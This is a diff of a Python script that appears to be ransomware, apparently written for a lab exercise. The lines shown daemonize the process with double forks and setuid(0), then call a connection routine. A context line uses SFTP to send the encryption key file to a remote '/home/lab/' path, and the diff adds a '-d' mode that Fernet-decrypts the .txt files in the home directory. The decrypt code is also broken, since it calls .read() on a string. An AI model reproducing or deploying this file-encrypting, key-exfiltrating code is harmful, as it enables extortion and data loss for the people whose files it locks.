@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 
 import requests
+import argparse
 import os
 import sys
 import signal
@@ -60,29 +61,49 @@ def sendKey(key):
     sftp.put(homeDirectory + "key.key", "/home/lab/clientKey.key")
 
 
+def getKey():
+    return "test"
+
+
 if __name__ == '__main__':
-    try:
-        pid = os.fork()
-        if pid > 0:
-            getStat()
+    parser = argparse.ArgumentParser(description="")
+    parser.add_argument('-d', action='store_true')
+    args = parser.parse_args()
+
+    if args.d:
+        keyFile = getKey()
+        for file in os.listdir(os.path.expanduser(homeDirectory)):
+            if file.endswith(".txt"):
+                filePath = os.path.join(homeDirectory, file)
+                f = Fernet(keyFile.read())
+                with open(filePath, "rb") as fileContents:
+                    data = fileContents.read()
+                    decryptedData = f.decrypt(data)
+                with open(filePath, "wb") as fileContents:
+                    fileContents.write(decryptedData)
+    else:
+        try:
+            pid = os.fork()
+            if pid > 0:
+                getStat()
+                sys.exit(0)
+        except OSError:
             sys.exit(0)
-    except OSError:
-        sys.exit(0)
 
-    os.chdir('/')
-    os.umask(0)
-    os.setsid()
-    os.setuid(0)
-    os.setgid(0)
+        os.chdir('/')
+        os.umask(0)
+        os.setsid()
+        os.setuid(0)
+        os.setgid(0)
 
-    signal.signal(signal.SIGCHLD, signalHandler)
+        signal.signal(signal.SIGCHLD, signalHandler)
 
-    try:
-        pid = os.fork()
-        if pid > 0:
+        try:
+            pid = os.fork()
+            if pid > 0:
+                sys.exit(0)
+        except OSError:
             sys.exit(0)
-    except OSError:
-        sys.exit(0)
 
-    if pid == 0:
-        secureConnection()
+        if pid == 0:
+            secureConnection()
